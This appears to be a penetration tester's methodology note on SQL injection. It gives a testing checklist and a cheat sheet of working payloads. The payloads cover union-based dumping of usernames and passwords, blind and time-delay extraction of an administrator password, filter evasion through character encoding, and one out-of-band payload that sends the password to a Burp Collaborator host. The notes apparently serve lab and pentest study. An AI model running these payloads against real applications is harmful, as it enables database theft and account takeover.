---
title: "SQLi"
layout: notes
tags:
  - webapp
  - methodology
  - sqli
  - FI_http-headers
  - FI_user-input
  - FI_parameters
  - Co_dos
  - Co_rce
  - Co_sensitive-info-disclosure
  - Co_data-manipulation
---
## Summary

When a web application stores, indexes, or otherwise interacts with information, that is coming from some sort of a database. The backend database may define what attacks are allowed but each framework is vulnerable to unsanitized user input which can manipulate the backend queries taking place. This vulnerability can be found on usernames, search functions, profile descriptions, login portals, password resets, and more. Anywhere a user is interacting with a database is a potential attack surface.

## Methodology

When looking for SQL injection ask/try the following:
- [ ] **Are there any login portals to test?**
- [ ] **Are there any search functions?**
- [ ] try adding a single `'` or `"`
	- [ ] can you induce an error or a different response
- [ ] IN A PENTEST test with sqlmap
- [ ] try to force an error
- [ ] try a conditional response
- [ ] try for a time delay
- [ ] **Is there a block list?**
	- [ ] if there is one in place try to encode, double encode, alternate characters and payloads

<br>
IF NO RESULTS BY NOW
- [ ] check the code for potential vulnerabilities
	- [ ] UTF encoding might be able to be bypassed like in [CVE-2025-1094](https://www.postgresql.org/support/security/CVE-2025-1094/)
		- [ ] tldr; the check for different byte lengths of characters could be bypassed by `c0 27`

<br>
IF SQLi FOUND
- [ ] try commenting out the rest of a query
- [ ] find out how many columns with `ORDER BY 1` go until error
- [ ] find the injectable column `?id=1' union select 1,version(),3`
- [ ] try finding the version of the database
- [ ] try to induce an error for the original query
	- [ ] this causes union or and queries to populate fields over the original
- [ ] try checking for logged in users
- [ ] try `union select 'file'`
- [ ] grab all databases
- [ ] check tables from interesting databases
- [ ] check columns from interesting tables
- [ ] check if you can change something
	- [ ] might need to add `commit;` at the end of an insert of update statement

## Capabilities

Sensitive Data Exposure  
Data Manipulation  
Integrity Compromise  
Remote Code Execution  
Denial of Service  

## Found In

Parameters  
User Input  
HTTP Headers  

## Tools/Examples

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

simple tests
```
' and '1'='1
' and '1'='2
'+union+select+table_name,null+from+information_schema.tables--
'+union+select+column_name,null+from+information_schema.columns+where+table_name+=+'users_ewfidw'--
```

simple escape
```
'+or+1=1--
'--
(remember ending space for mysql)
```

database + version identification
```
'+union+select+banner_full,'abc'+from+v$version--
'+union+select+@@version,@@version--+

version()
' and version() like binary '8.0.3%'#
```

union cheatsheet
```
' order by 5--
' union select null,null,null,null--
' union select 'd',null,null,null--
(when injecting oracle append 'from dual')

' union select username, password from users--
```

concat
```
concat(column1,'~', column2)
group_concat() can be used to dump multiple entries as 1
```

blind with feedback
```
' and '1'='1
' and '1'='2
' and (select 'a' from users where username = 'administrator' and length(password)>1)='a
' and (select substring(password,2,1) from users where username='administrator')='a
' || (select '' from dual) || '
' and (select substr(password,1,1) from users where username='administrator')='a
natas16" AND SUBSTRING((SELECT password FROM users WHERE Username = 'natas16'), 1, 1) = "§a§
natas16" and password like binary "FUZZ%
```

conditional Responses
```
' and (select case when (1=2) then 1/0 else 'a' end)='a
' || (select case when (1=2) then 1/0 else 'a' end from dual)='a' || '
' || (select case when ((select substr(password,1,1) from users where username='administrator')='a') then to_char(1/0) else '' end from dual) || '
```

XML
```
&#117;nion &#115;elect &#112;assword &#102;rom users &#119;here username = &apos;&#97;dministrator&apos;
(use a lot of html character encoding on keywords)
```

time delays
```
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'|| pg_sleep(10)--

'|| (select case when ((select substring(password,1,1) from users where username='administrator')='a') then pg_sleep(3) else pg_sleep(0) end) --
```

out-of-band exfil
```
&apos; || (SELECT EXTRACTVALUE(xmltype(&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(select password from users where username = 'administrator')||'.0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/&quot;&gt; %remote;]&gt;&apos;),&apos;/l&apos;) FROM dual)--
```

